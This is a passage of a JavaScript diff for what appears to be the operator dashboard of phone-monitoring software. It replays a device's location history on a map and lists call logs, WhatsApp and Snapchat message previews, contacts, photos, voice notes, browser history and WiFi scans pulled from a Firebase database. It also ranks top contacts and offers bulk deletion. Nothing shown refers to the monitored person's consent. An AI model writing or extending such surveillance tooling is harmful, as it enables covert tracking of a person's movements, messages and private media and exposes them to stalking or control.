+    if (segFrom - 1 >= 0) {
+      segTo = segFrom;
+      segFrom = segFrom - 1;
+    } else {
+      if (playbackLoop) { segFrom = pts.length - 2; segTo = pts.length - 1; }
+      else { stopPlayback(); return false; }
+    }
+  }
+  segRealGap = Math.abs(pts[segTo].ts - pts[segFrom].ts);
+  if (segRealGap <= 0) segRealGap = 1000;
+  if (segRealGap > 3600000) segRealGap = 3600000;
+  segStartTime = performance.now();
+  return true;
+}
+
+function animatePlayback() {
+  if (!playbackRunning) return;
+  const pts = playbackPoints;
+  const speed = parseInt(document.getElementById('speedSelect').value);
+  const elapsed = (performance.now() - segStartTime) * speed;
+  let t = elapsed / segRealGap;
+  if (t >= 1) {
+    const fromP = pts[segFrom], toP = pts[segTo];
+    updatePlaybackDisplay(toP.lat, toP.lng, toP.ts, segFrom, segTo, 1);
+    if (!advanceSegment()) return;
+    t = 0;
+    segStartTime = performance.now();
+  }
+  const fromP = pts[segFrom], toP = pts[segTo];
+  const lat = lerp(fromP.lat, toP.lat, t);
+  const lng = lerp(fromP.lng, toP.lng, t);
+  const ts = lerp(fromP.ts, toP.ts, t);
+  updatePlaybackDisplay(lat, lng, ts, segFrom, segTo, t);
+  animFrameId = requestAnimationFrame(animatePlayback);
+}
+
+document.getElementById('playBtn').addEventListener('click', function() {
+  if (playbackRunning) { stopPlayback(); return; }
+  const pts = playbackPoints;
+  if (!pts.length) return;
+  if (playbackIdx < 0 || playbackIdx >= pts.length) {
+    playbackIdx = playbackDirection === 1 ? 0 : pts.length - 1;
+  }
+  segFrom = Math.max(0, Math.min(playbackIdx, pts.length - 2));
+  segTo = segFrom + 1;
+  if (playbackDirection === -1) { segFrom = segTo; segTo = segFrom - 1; }
+  segRealGap = Math.abs(pts[segTo].ts - pts[segFrom].ts);
+  if (segRealGap <= 0) segRealGap = 1000;
+  if (segRealGap > 3600000) segRealGap = 3600000;
+  segStartTime = performance.now();
+  playbackRunning = true;
+  this.textContent = '\u23F8';
+  document.getElementById('statusDot').textContent = '\u25B6 Playing';
+  document.getElementById('statusDot').className = 'status';
+  animatePlayback();
+});
+
+document.getElementById('rewindBtn').addEventListener('click', () => {
+  stopPlayback();
+  playbackIdx = playbackDirection === 1 ? 0 : playbackPoints.length - 1;
+  document.getElementById('playBtn').textContent = '\u25B6';
+  document.getElementById('playScrubber').value = 0;
+  document.getElementById('playCount').textContent = playbackPoints.length ? '1/' + playbackPoints.length : '0/0';
+  if (playbackPoints.length && playbackPoints[playbackIdx]) {
+    const p = playbackPoints[playbackIdx];
+    setMarkerPos(p.lat, p.lng, p.ts);
+    if (marker) marker.setPopupContent(pkt(p.ts)).openPopup();
+    map.panTo([p.lat, p.lng], { animate: true, duration: 0.3 });
+    updatePlaybackUI(p);
+  }
+});
+
+// --- Direction Toggle ---
+document.getElementById('dirBtn').addEventListener('click', function() {
+  playbackDirection = playbackDirection === 1 ? -1 : 1;
+  this.textContent = playbackDirection === 1 ? '\u2192' : '\u2190';
+  this.title = 'Direction: ' + (playbackDirection === 1 ? 'Forward' : 'Reverse');
+  this.classList.toggle('pb-on', playbackDirection === -1);
+  stopPlayback();
+  document.getElementById('playBtn').textContent = '\u25B6';
+});
+
+// --- Loop Toggle ---
+document.getElementById('loopBtn').addEventListener('click', function() {
+  playbackLoop = !playbackLoop;
+  this.classList.toggle('pb-on', playbackLoop);
+  this.title = 'Loop: ' + (playbackLoop ? 'On' : 'Off');
+});
+
+// --- Scrubber ---
+document.getElementById('playScrubber').addEventListener('input', function() {
+  if (playbackRunning) stopPlayback();
+  const pts = playbackPoints;
+  if (!pts.length) return;
+  const totalSegs = Math.max(1, pts.length - 1);
+  const segIdx = Math.min(totalSegs - 1, Math.floor((parseInt(this.value) / 1000) * totalSegs));
+  playbackIdx = segIdx;
+  const p = pts[segIdx];
+  if (p) {
+    setMarkerPos(p.lat, p.lng, p.ts);
+    if (marker) marker.setPopupContent(pkt(p.ts)).openPopup();
+    document.getElementById('playCount').textContent = `${segIdx + 1}/${pts.length}`;
+    updatePlaybackUI(p);
+    highlightPointInList(segIdx);
+  }
+});
+
+// --- Load History (with Period Filter) ---
+async function loadDeviceHistory(deviceId, periodSeconds, maxAccuracy) {
+  const pts = [];
+  // Single fetch — walk the entire tree in-memory (no recursive HTTP calls)
+  const data = await fetchRTDB(`devices/${deviceId}/location/history`);
+  if (!data || typeof data !== 'object') return pts;
+  function walk(obj) {
+    if (!obj || typeof obj !== 'object') return;
+    for (const [k, v] of Object.entries(obj)) {
+      if (v && typeof v === 'object') {
+        if (v.lat !== undefined) {
+          const ts = parseInt(k);
+          if (!ts) continue;
+          const acc = v.accuracy !== undefined && v.accuracy !== null ? parseFloat(v.accuracy) : 999;
+          if (!maxAccuracy || acc <= maxAccuracy) {
+            pts.push({
+              ts,
+              lat: parseFloat(v.lat),
+              lng: parseFloat(v.lng),
+              accuracy: acc,
+              speed: v.speed != null ? parseFloat(v.speed) : 0,
+              isHighAccuracy: v.isHighAccuracy === true,
+              satellites: v.satellites != null ? parseInt(v.satellites) : 0
+            });
+          }
+        } else {
+          walk(v);
+        }
+      }
+    }
+  }
+  walk(data);
+  // Deduplicate by lat|lng|rounded_second (keep first occurrence)
+  const seen = new Set();
+  const deduped = [];
+  for (const p of pts) {
+    const sec = Math.floor(p.ts / 1000);
+    const k = `${p.lat.toFixed(4)}|${p.lng.toFixed(4)}|${sec}`;
+    if (!seen.has(k)) { seen.add(k); deduped.push(p); }
+  }
+  pts.length = 0; pts.push(...deduped);
+  pts.sort((a, b) => a.ts - b.ts);
+  if (periodSeconds > 0 && pts.length) {
+    const cutoff = pts[pts.length - 1].ts - periodSeconds * 1000;
+    return pts.filter(p => p.ts >= cutoff);
+  }
+  return pts;
+}
+
+async function reloadHistory(showAlertMsg) {
+  if (!selectedDevice) return;
+  if (playbackRunning) stopPlayback();
+  const periodSeconds = parseInt(document.getElementById('periodUnit').value);
+  const accVal = parseInt(document.getElementById('accuracyFilter').value);
+  const maxAcc = accVal > 0 ? accVal : 0;
+  const pts = await loadDeviceHistory(selectedDevice, periodSeconds, maxAcc);
+  if (!pts.length) {
+    if (showAlertMsg) showAlert('No history points in range', 'warn');
+    return;
+  }
+  locationHistory = pts;
+  updateTrail();
+  renderPlaybackTab();
+  if (pts.length) map.fitBounds(pts.map(p => [p.lat, p.lng]));
+  if (showAlertMsg) {
+    const label = document.getElementById('periodUnit').options[document.getElementById('periodUnit').selectedIndex].text;
+    showAlert(`Loaded ${pts.length} points (${label})`, 'warn');
+  }
+}
+
+document.getElementById('loadHistoryBtn').addEventListener('click', () => reloadHistory(true));
+
+async function loadDefaultHistory() { reloadHistory(false); }
+
+document.getElementById('accuracyFilter').addEventListener('change', () => {
+  if (historyAutoLoaded) reloadHistory(true);
+});
+document.getElementById('periodUnit').addEventListener('change', () => {
+  if (historyAutoLoaded) reloadHistory(true);
+});
+
+// --- Playback Tab ---
+function calcTrailDistance(pts) {
+  let total = 0;
+  for (let i = 1; i < pts.length; i++) {
+    total += haversine(pts[i-1].lat, pts[i-1].lng, pts[i].lat, pts[i].lng);
+  }
+  return total;
+}
+
+function formatDuration(ms) {
+  if (ms < 60000) return Math.round(ms/1000) + 's';
+  if (ms < 3600000) return Math.round(ms/60000) + 'm';
+  if (ms < 86400000) return (ms/3600000).toFixed(1) + 'h';
+  return (ms/86400000).toFixed(1) + 'd';
+}
+
+function formatDistance(m) {
+  if (m < 1000) return Math.round(m) + 'm';
+  return (m/1000).toFixed(1) + 'km';
+}
+
+function renderPlaybackTab() {
+  const pts = playbackPoints.length ? playbackPoints : locationHistory;
+  // Deduplicate in-place by lat|lng|rounded_second
+  const seen = new Set();
+  for (let i = pts.length - 1; i >= 0; i--) {
+    const p = pts[i];
+    if (!p || !p.lat) { pts.splice(i, 1); continue; }
+    const sec = Math.floor((p.ts || 0) / 1000);
+    const k = `${p.lat.toFixed(4)}|${p.lng.toFixed(4)}|${sec}`;
+    if (seen.has(k)) { pts.splice(i, 1); }
+    else seen.add(k);
+  }
+  const statsEl = document.getElementById('pbStats');
+  const listEl = document.getElementById('pbPointList');
+  if (!pts.length) {
+    statsEl.style.display = 'none';
+    listEl.innerHTML = '<div class="label">Load history to see points</div>';
+    return;
+  }
+  statsEl.style.display = 'block';
+  document.getElementById('stPoints').textContent = pts.length;
+  const dur = pts.length > 1 ? pts[pts.length-1].ts - pts[0].ts : 0;
+  document.getElementById('stDuration').textContent = formatDuration(dur);
+  const dist = calcTrailDistance(pts);
+  document.getElementById('stDistance').textContent = formatDistance(dist);
+  const haCount = pts.filter(p => p.isHighAccuracy).length;
+  document.getElementById('stHighAcc').textContent = haCount;
+  const first = pts[0], last = pts[pts.length-1];
+  document.getElementById('stRange').textContent = (first.ts && last.ts) ? pktTime(first.ts) + ' \u2192 ' + pktTime(last.ts) : '--';
+  const groups = {};
+  for (let i = 0; i < pts.length; i++) {
+    const p = pts[i];
+    const day = new Date(p.ts).toLocaleDateString('en-PK', { timeZone: PKT, day: '2-digit', month: 'short', weekday: 'short' });
+    if (!groups[day]) groups[day] = [];
+    groups[day].push({ idx: i, p });
+  }
+  let html = '<div class="pb-point-list">';
+  const activeIdx = playbackRunning ? playbackIdx : -1;
+  for (const [day, entries] of Object.entries(groups)) {
+    html += `<div class="pb-day">${day} <span style="font-weight:400;color:var(--muted)">(${entries.length})</span></div>`;
+    for (const { idx, p } of entries) {
+      const active = idx === activeIdx ? ' pb-point-active' : '';
+      const speed = p.speed != null ? (p.speed).toFixed(1) + 'm/s' : '';
+      const acc = p.accuracy != null ? '\u00B1' + p.accuracy + 'm' : '';
+      const ha = p.isHighAccuracy ? '\u2B50' : '';
+      const sat = p.satellites ? p.satellites + '\uD83D\uDDF2' : '';
+      const meta = [ha, speed, acc, sat].filter(s => s).join(' ');
+      const haClass = p.isHighAccuracy ? ' pb-ha' : '';
+      const addrKey = p.lat.toFixed(3) + ',' + p.lng.toFixed(3);
+      const cached = cachedAddresses[addrKey];
+      const addrText = cached ? (cached.display_name || cached.name || '') : '';
+      const addrHtml = addrText
+        ? `<span class="ppt-addr done" title="${escHtml(addrText)}">${escHtml(addrText)}</span>`
+        : `<span class="ppt-addr loading" data-addr-key="${addrKey}" data-addr-lat="${p.lat}" data-addr-lng="${p.lng}">${cached === undefined ? '\u{1F4CD} resolving...' : '--'}</span>`;
+      html += `<div class="pb-point-row${active}${haClass}" data-pb-idx="${idx}">
+        <span class="ppt-ts">${p.ts ? pktShort(p.ts) : '--'}</span>
+        <span class="ppt-coord">${p.lat.toFixed(4)}, ${p.lng.toFixed(4)}</span>
+        <span class="ppt-meta">${meta || '--'}</span>
+        ${addrHtml}
+      </div>`;
+    }
+  }
+  html += '</div>';
+  listEl.innerHTML = html;
+  listEl.querySelectorAll('.pb-point-row').forEach(el => {
+    el.addEventListener('click', function() {
+      const idx = parseInt(this.dataset.pbIdx);
+      jumpToPoint(idx);
+    });
+  });
+  // Resolve uncached addresses in background
+  resolvePlaybackAddresses();
+}
+
+function resolvePlaybackAddresses() {
+  const loading = document.querySelectorAll('.ppt-addr.loading[data-addr-key]');
+  if (!loading.length) return;
+  loading.forEach(el => {
+    const key = el.dataset.addrKey;
+    if (cachedAddresses[key]) {
+      const addr = cachedAddresses[key];
+      el.textContent = addr.display_name || addr.name || '';
+      el.className = 'ppt-addr done';
+      el.title = el.textContent;
+      return;
+    }
+    const lat = parseFloat(el.dataset.addrLat);
+    const lng = parseFloat(el.dataset.addrLng);
+    geocode(lat, lng).then(d => {
+      if (d) {
+        el.textContent = d.display_name || d.name || '';
+        el.className = 'ppt-addr done';
+        el.title = el.textContent;
+      } else {
+        el.textContent = '??';
+        el.className = 'ppt-addr';
+      }
+    });
+  });
+}
+
+function highlightPointInList(idx) {
+  const listEl = document.getElementById('pbPointList');
+  listEl.querySelectorAll('.pb-point-row').forEach(el => {
+    el.classList.toggle('pb-point-active', parseInt(el.dataset.pbIdx) === idx);
+  });
+  const activeEl = listEl.querySelector('.pb-point-active');
+  if (activeEl) activeEl.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
+}
+
+function jumpToPoint(idx) {
+  if (playbackRunning) stopPlayback();
+  const pts = playbackPoints.length ? playbackPoints : locationHistory;
+  if (idx < 0 || idx >= pts.length) return;
+  playbackIdx = idx;
+  const p = pts[idx];
+  setMarkerPos(p.lat, p.lng, p.ts);
+  if (marker) marker.setPopupContent(pkt(p.ts)).openPopup();
+  map.panTo([p.lat, p.lng], { animate: true, duration: 0.3 });
+  const totalSegs = Math.max(1, pts.length - 1);
+  document.getElementById('playScrubber').value = Math.floor((idx / totalSegs) * 1000);
+  document.getElementById('playCount').textContent = `${idx + 1}/${pts.length}`;
+  updatePlaybackUI(p);
+  document.getElementById('playTsStart').textContent = pts[0].ts ? pktTime(pts[0].ts) : '--';
+  document.getElementById('playTsEnd').textContent = pts[pts.length-1].ts ? pktTime(pts[pts.length-1].ts) : '--';
+  highlightPointInList(idx);
+}
+
+// --- Timeline ---
+let timelineFilter = 'all';
+document.querySelectorAll('.chip[data-filter]').forEach(chip => {
+  chip.addEventListener('click', () => {
+    document.querySelectorAll('.chip[data-filter]').forEach(c => c.classList.remove('active'));
+    chip.classList.add('active');
+    timelineFilter = chip.dataset.filter;
+    if (timelineCache) renderTimeline(timelineCache);
+    else pollHistory();
+  });
+});
+
+function renderTimeline(docs) {
+  const list = document.getElementById('timelineList');
+  const counts = { all: docs.length };
+  for (const d of docs) {
+    const type = (d.type || '').toLowerCase();
+    if (type === 'location') counts.location = (counts.location || 0) + 1;
+    if (type.includes('call')) counts.call = (counts.call || 0) + 1;
+    if (type.includes('whatsapp') || type.includes('message')) counts.whatsapp = (counts.whatsapp || 0) + 1;
+    if (type.includes('snapchat')) counts.snapchat = (counts.snapchat || 0) + 1;
+  }
+  document.querySelectorAll('.chip[data-filter]').forEach(chip => {
+    const f = chip.dataset.filter;
+    chip.textContent = chip.dataset.label + (counts[f] !== undefined ? ' (' + counts[f] + ')' : '');
+  });
+  const filtered = docs.filter(d => {
+    const type = (d.type || '').toLowerCase();
+    if (timelineFilter === 'all') return true;
+    if (timelineFilter === 'location') return type === 'location';
+    if (timelineFilter === 'call') return type.includes('call');
+    if (timelineFilter === 'whatsapp') return type.includes('whatsapp') || type.includes('message');
+    if (timelineFilter === 'snapchat') return type.includes('snapchat');
+    return true;
+  }).slice(0, 200);
+  if (!filtered.length) { list.innerHTML = '<div class="label">No entries</div>'; return; }
+  const deduped = [];
+  for (const d of filtered) {
+    const last = deduped[deduped.length - 1];
+    if (last && (d.type || '').includes(last.type || '') &&
+        (d.contactName || d.contact || '') === (last.contactName || last.contact || '') &&
+        Math.abs(parseInt(d.ts_ms || '0') - parseInt(last.ts_ms || '0')) < 60000) {
+      continue;
+    }
+    deduped.push(d);
+  }
+  const groups = {};
+  for (const d of deduped) {
+    const day = new Date(parseInt(d.ts_ms || '0')).toLocaleDateString('en-PK', { timeZone: PKT, day: '2-digit', month: 'short', weekday: 'short' });
+    if (!groups[day]) groups[day] = [];
+    groups[day].push(d);
+  }
+  let html = '';
+  for (const [day, entries] of Object.entries(groups)) {
+    const locs = entries.filter(e => (e.type || '').toLowerCase() === 'location').length;
+    const calls = entries.filter(e => (e.type || '').includes('call')).length;
+    const msgs = entries.filter(e => (e.type || '').includes('whatsapp') || (e.type || '').includes('message')).length;
+    const snaps = entries.filter(e => (e.type || '').includes('snapchat')).length;
+    const summary = [locs ? `${locs}📍` : '', calls ? `${calls}📞` : '', msgs ? `${msgs}💬` : '', snaps ? `${snaps}📸` : ''].filter(Boolean).join(' ');
+    html += `<div class="tl-group"><div class="tl-day">${day}</div><div class="tl-summary">${summary}</div>`;
+    for (const d of entries) {
+      const type = d.type || '';
+      const ts = parseInt(d.ts_ms || '0');
+      const icon = type.includes('snapchat') ? '\u{1F4F8}' : type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : '\u{1F4CD}';
+      const contact = d.contactName || d.contact || '';
+      const msg = d.messagePreview || '';
+      const dur = d.duration || '';
+      const dir = d.direction || '';
+      html += `<div class="card">
+        <div class="time">${icon} ${pkt(ts)}</div>
+        <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}</div>
+      </div>`;
+    }
+    html += '</div>';
+  }
+  list.innerHTML = html;
+}
+
+function renderCalls(docs) {
+  const body = document.getElementById('callsBody');
+  const calls = docs.filter(d => (d.type || '').includes('call')).slice(0, 100);
+  body.innerHTML = calls.map(d => {
+    const ts = parseInt(d.ts_ms || '0');
+    const name = d.contactName || d.contact || '';
+    const number = d.contactNumber || '';
+    const numDisplay = name && number ? `${name} (${number})` : name || number || '--';
+    const dur = d.duration || '--';
+    const dir = d.direction || '--';
+    const loc = d.location || '';
+    return `<tr><td>${pktShort(ts)}</td><td>${numDisplay}</td><td>${dur}s</td><td>${dir}${loc ? '<br><span style="font-size:13px;color:var(--muted)">\u{1F4CD} ' + loc + '</span>' : ''}</td></tr>`;
+  }).join('') || '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
+}
+
+// --- App period selector ---
+document.querySelectorAll('.app-period-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.app-period-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    if (btn.dataset.period === 'mostRecent') {
+      if (appSnapshotsCache) renderAppSnapshots();
+      else pollAppSnapshots();
+    } else if (appsCache) {
+      renderApps(appsCache);
+    } else {
+      pollApps();
+    }
+  });
+});
+
+// --- Copy coords ---
+document.addEventListener('keydown', e => {
+  if (e.key === 'c' && e.ctrlKey) {
+    const text = document.getElementById('coordBox').textContent;
+    if (text !== '--' && navigator.clipboard) navigator.clipboard.writeText(text).catch(() => {});
+  }
+});
+
+// --- Timeline Search ---
+document.getElementById('timelineSearch').addEventListener('input', function() {
+  const q = this.value.toLowerCase();
+  document.querySelectorAll('#timelineList .tl-group').forEach(g => {
+    const text = g.textContent.toLowerCase();
+    g.style.display = q === '' || text.includes(q) ? '' : 'none';
+  });
+});
+
+// --- Insights ---
+async function renderInsights() {
+  if (!selectedDevice) return;
+  const [hist, apps, tl] = await Promise.all([
+    fetchRTDB(`devices/${selectedDevice}/location/history`, 'shallow=true'),
+    fetchRTDB(`devices/${selectedDevice}/apps`),
+    fetchRTDB(`devices/${selectedDevice}/timeline`)
+  ]);
+  
+  // Location changes per hour (last 24h)
+  const locByHour = new Array(24).fill(0);
+  if (hist && typeof hist === 'object') {
+    const now = Date.now();
+    async function countLocations(obj) {
+      if (!obj || typeof obj !== 'object') return;
+      for (const [k, v] of Object.entries(obj)) {
+        if (v && typeof v === 'object' && !v.lat) {
+          await countLocations(v);
+        } else if (v && v.lat) {
+          const ts = parseInt(k);
+          if (!isNaN(ts) && now - ts < 86400000) {
+            const h = new Date(ts).getHours();
+            locByHour[h]++;
+          }
+        }
+      }
+    }
+    await countLocations(hist);
+  }
+  const locChart = document.getElementById('inLocChart');
+  if (locChart) {
+    const max = Math.max(...locByHour, 1);
+    locChart.innerHTML = locByHour.map((v, h) => 
+      `<div title="${h}:00 - ${v} changes" style="flex:1;background:var(--border);border-radius:2px;overflow:hidden;height:50px;display:flex;flex-direction:column-reverse">
+        <div style="height:${(v/max*100).toFixed(0)}%;background:var(--accent);border-radius:2px"></div>
+      </div>`
+    ).join('');
+    document.getElementById('inUniqueLocs').textContent = locByHour.filter(v => v > 0).length + ' hrs active';
+  }
+  
+  // Today's activity
+  const todayStr = new Date().toISOString().slice(0,10);
+  const todayLocs = locByHour.reduce((a, b) => a + b, 0);
+  document.getElementById('inTodayActivity').textContent = todayLocs + ' changes';
+
+  // Top contacts from timeline
+  const contactCount = {};
+  if (tl && typeof tl === 'object') {
+    let callsToday = 0;
+    Object.values(tl).forEach(entry => {
+      if (entry.type === 'call' || entry.type === 1 || entry.type === 2 || entry.type === 3) {
+        const num = entry.number || 'unknown';
+        contactCount[num] = (contactCount[num] || 0) + 1;
+        const ts = parseInt(entry.ts_ms);
+        if (!isNaN(ts) && new Date(ts).toISOString().slice(0,10) === todayStr) callsToday++;
+      }
+    });
+    document.getElementById('inCallsToday').textContent = callsToday;
+  }
+  const sortedContacts = Object.entries(contactCount).sort((a, b) => b[1] - a[1]).slice(0, 10);
+  const tcEl = document.getElementById('inTopContacts');
+  if (tcEl) {
+    tcEl.innerHTML = sortedContacts.length 
+      ? sortedContacts.map(([num, count]) => 
+          `<div style="display:flex;justify-content:space-between;padding:2px 0;font-size:14px">
+            <span>${escHtml(num)}</span><span style="color:var(--accent)">${count}x</span>
+          </div>`).join('')
+      : '<span class="label">No call data available</span>';
+  }
+
+  // Activity heatmap (hour of day)
+  const heatEl = document.getElementById('inHeatmap');
+  if (heatEl) {
+    const maxH = Math.max(...locByHour, 1);
+    heatEl.innerHTML = locByHour.map((v, h) => {
+      const pct = (v / maxH * 100);
+      const intensity = pct > 75 ? '#ffca28' : pct > 50 ? '#f0b800' : pct > 25 ? '#c89600' : '#30363d';
+      return `<div title="${h}:00 - ${v}" style="width:24px;height:24px;background:${intensity};border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:9px;color:${pct > 50 ? '#000' : 'var(--text)'}">${h}</div>`;
+    }).join('');
+  }
+}
+
+// --- Storage & Cleanup ---
+function formatBytes(bytes) {
+  if (!bytes || bytes < 0) return '0 B';
+  const units = ['B', 'KB', 'MB', 'GB'];
+  let i = 0;
+  let val = bytes;
+  while (val >= 1024 && i < units.length - 1) { val /= 1024; i++; }
+  return val.toFixed(i > 0 ? 1 : 0) + ' ' + units[i];
+}
+
+async function deleteRTDB(path) {
+  try {
+    const r = await fetch(`${RTDB}/${path}.json`, { method: 'DELETE' });
+    return r.ok;
+  } catch { return false; }
+}
+
+async function estimateNodeSize(path, sampleSize = 3) {
+  const keys = await fetchRTDB(path, 'shallow=true');
+  if (!keys || typeof keys !== 'object') return { count: 0, bytes: 0 };
+  const entries = Object.keys(keys);
+  const count = entries.length;
+  if (count === 0) return { count: 0, bytes: 0 };
+  let totalBytes = 0;
+  let sampled = 0;
+  const toSample = entries.sort(() => Math.random() - 0.5).slice(0, sampleSize);
+  for (const key of toSample) {
+    try {
+      const r = await fetch(`${RTDB}/${path}/${key}.json`);
+      if (r.ok) {
+        const text = await r.text();
+        totalBytes += new Blob([text]).size;
+        sampled++;
+      }
+    } catch {}
+  }
+  const avgBytes = sampled > 0 ? totalBytes / sampled : 0;
+  return { count, bytes: Math.round(count * avgBytes) };
+}
+
+async function refreshStorage() {
+  if (!selectedDevice) return;
+  const el = document.getElementById('storageOverview');
+  el.innerHTML = '<div class="label">Scanning storage...</div>';
+  const devicePath = `devices/${selectedDevice}`;
+  try {
+    const [photos, voice, timeline, contacts, apps, location, browser, wifi] = await Promise.all([
+      estimateNodeSize(`${devicePath}/photos`, 3),
+      estimateNodeSize(`${devicePath}/voice_notes`, 2),
+      estimateNodeSize(`${devicePath}/timeline`, 1),
+      estimateNodeSize(`${devicePath}/contacts`, 1),
+      estimateNodeSize(`${devicePath}/apps`, 1),
+      estimateNodeSize(`${devicePath}/location`, 1),
+      estimateNodeSize(`${devicePath}/browser_history`, 1),
+      estimateNodeSize(`${devicePath}/wifi_scan`, 1)
+    ]);
+    const categories = [
+      { name: 'Photos', icon: '📸', path: 'photos', ...photos },
+      { name: 'Voice Notes', icon: '🎤', path: 'voice_notes', ...voice },
+      { name: 'Timeline', icon: '📞', path: 'timeline', ...timeline },
+      { name: 'Contacts', icon: '👥', path: 'contacts', ...contacts },
+      { name: 'App Usage', icon: '📊', path: 'apps', ...apps },
+      { name: 'Location', icon: '📍', path: 'location', ...location },
+      { name: 'Browser History', icon: '🌐', path: 'browser_history', ...browser },
+      { name: 'WiFi Scans', icon: '📡', path: 'wifi_scan', ...wifi }
+    ];
+    let totalBytes = 0;
+    let html = '<div style="font-size:15px;font-weight:500;margin-bottom:6px">📊 Storage Overview</div>';
+    html += '<table style="font-size:14px"><thead><tr><th>Category</th><th>Entries</th><th>Est. Size</th></tr></thead><tbody>';
+    for (const cat of categories) {
+      totalBytes += cat.bytes;
+      html += `<tr><td>${cat.icon} ${cat.name}</td><td>${cat.count === 0 ? '—' : cat.count}</td><td>${cat.count === 0 ? '—' : formatBytes(cat.bytes)}</td></tr>`;
+    }
+    html += `<tr style="border-top:2px solid var(--accent);font-weight:600"><td>Total</td><td>${categories.reduce((s, c) => s + c.count, 0)}</td><td>${formatBytes(totalBytes)}</td></tr>`;
+    html += '</tbody></table>';
+    html += '<div style="font-size:12px;color:var(--muted);margin-top:4px">* Sizes estimated from random samples. Refresh to update.</div>';
+    el.innerHTML = html;
+    renderCleanupActions(categories);
+  } catch {
+    el.innerHTML = '<div class="label" style="color:var(--danger)">Failed to scan storage</div>';
+  }
+}
+
+function renderCleanupActions(categories) {
+  const el = document.getElementById('cleanupActions');
+  const actions = [
+    { label: '🧹 Dedup Photos', desc: 'Remove duplicate photos (keep highest quality)', action: 'dedupPhotos', path: 'photos', icon: '📸' },
+    { label: '🗑 Delete All Photos', desc: 'Remove all uploaded photos', action: 'deleteAll', path: 'photos', icon: '📸', dangerous: true },
+    { label: '♻️ Clear Photo Dedup Cache', desc: 'Reset local dedup cache to re-scan all photos', action: 'clearPhotoCache', path: 'photos', icon: '📸' },
+    { label: '👥 Dedup Contacts', desc: 'Merge duplicate contacts by phone number', action: 'dedupContacts', path: 'contacts', icon: '👥' },
+    { label: '🗑 Delete Voice Notes', desc: 'Remove all voice recordings', action: 'deleteAll', path: 'voice_notes', icon: '🎤', dangerous: true },
+    { label: '🔄 Clear Voice Audio Budget', desc: 'Reset 30-day audio budget to allow new voice uploads', action: 'clearVoiceBudget', path: 'voice_notes', icon: '🎤' },
+    { label: '🗑 Delete Timeline', desc: 'Remove call logs & timeline events', action: 'deleteAll', path: 'timeline', icon: '📞', dangerous: true },
+    { label: '🗑 Delete App Usage', desc: 'Remove app usage history', action: 'deleteAll', path: 'apps', icon: '📊', dangerous: true },
+    { label: '🧹 Dedup Locations', desc: 'Remove duplicate location entries', action: 'dedupLocations', path: 'location', icon: '📍' },
+    { label: '🗑 Delete Location History', desc: 'Remove location data (keeps current)', action: 'deleteLocHistory', path: 'location', icon: '📍', dangerous: true },
+    { label: '🗑 Delete Browser History', desc: 'Remove all browsing history', action: 'deleteAll', path: 'browser_history', icon: '🌐', dangerous: true },
+    { label: '🗑 Delete WiFi Scans', desc: 'Remove all WiFi scan data', action: 'deleteAll', path: 'wifi_scan', icon: '📡', dangerous: true },
+    { label: '⚠️ DELETE EVERYTHING', desc: 'Wipe ALL data for this device from RTDB', action: 'deleteAllData', path: '', icon: '☠️', dangerous: true }
+  ];
+  el.innerHTML = actions.map(a => {
+    const cat = categories.find(c => c.path === a.path);
+    const count = cat ? cat.count : 0;
+    return `<div class="card" style="border-left-color:${a.dangerous ? 'var(--danger)' : 'var(--accent)'};padding:10px 14px;margin-bottom:6px">
+      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px">
+        <div>
+          <div style="font-size:15px;font-weight:500">${a.label}</div>
+          <div style="font-size:13px;color:var(--muted)">${a.desc}${count > 0 ? ` (${count} entries)` : ''}</div>
+        </div>
+        <button class="chip" style="background:${a.dangerous ? 'var(--danger)' : 'var(--accent)'};color:#000;border-color:transparent;font-size:13px" onclick="execCleanup('${a.action}','${a.path}')" ${count === 0 && a.action !== 'deleteAllData' ? 'disabled' : ''}>${a.dangerous ? '⚠ Delete' : 'Run'}</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+async function execCleanup(action, path) {
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  const base = `devices/${selectedDevice}`;
+  if (action === 'dedupPhotos') {
+    if (!confirm('Scan and remove duplicate photos? Only one copy per unique photo will be kept (the highest quality version).')) return;
+    showAlert('Scanning photo duplicates...', 'warn');
+    const keys = await fetchRTDB(`${base}/photos`, 'shallow=true');
+    if (!keys || typeof keys !== 'object') { showAlert('No photos found', 'error'); return; }
+    const allKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
+    const groups = {};
+    let scanned = 0;
+    for (const k of allKeys) {
+      const doc = await fetchRTDB(`${base}/photos/${k}`);
+      if (doc && doc.fileName) {
+        const gk = doc.fileName + '|' + (doc.dateTaken || '');
+        if (!groups[gk]) groups[gk] = [];
+        groups[gk].push({ key: k, size: (doc.data || '').length });
+      }
+      scanned++;
+      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning photo ${scanned}/${allKeys.length}...</div>`;
+    }
+    let deleted = 0, freed = 0;
+    for (const [gk, entries] of Object.entries(groups)) {
+      if (entries.length <= 1) continue;
+      entries.sort((a, b) => b.size - a.size);
+      for (let i = 1; i < entries.length; i++) {
+        const ok = await deleteRTDB(`${base}/photos/${entries[i].key}`);
+        if (ok) { deleted++; freed += entries[i].size; }
+      }
+    }
+    // Clear cache and reload
+    cachedPhotos = {};
+    await loadPhotos();
+    renderPhotosFromCache();
+    await refreshStorage();
+    showAlert(`Deleted ${deleted} duplicate photos (freed ${formatBytes(freed)})`, deleted > 0 ? 'warn' : 'error');
+    return;
+  }
+  if (action === 'dedupContacts') {
+    if (!confirm('Scan and remove duplicate contacts? Only one entry per unique phone number will be kept (preferring entries with names).')) return;
+    showAlert('Scanning contacts...', 'warn');
+    const data = await fetchRTDB(`${base}/contacts/all`);
+    if (!data || !data.contacts) { showAlert('No contacts found', 'error'); return; }
+    const raw = data.contacts;
+    const seen = new Map();
+    const entries = [];
+    const extract = c => ({
+      name: c.displayName || c.name || c.number || 'Unknown',
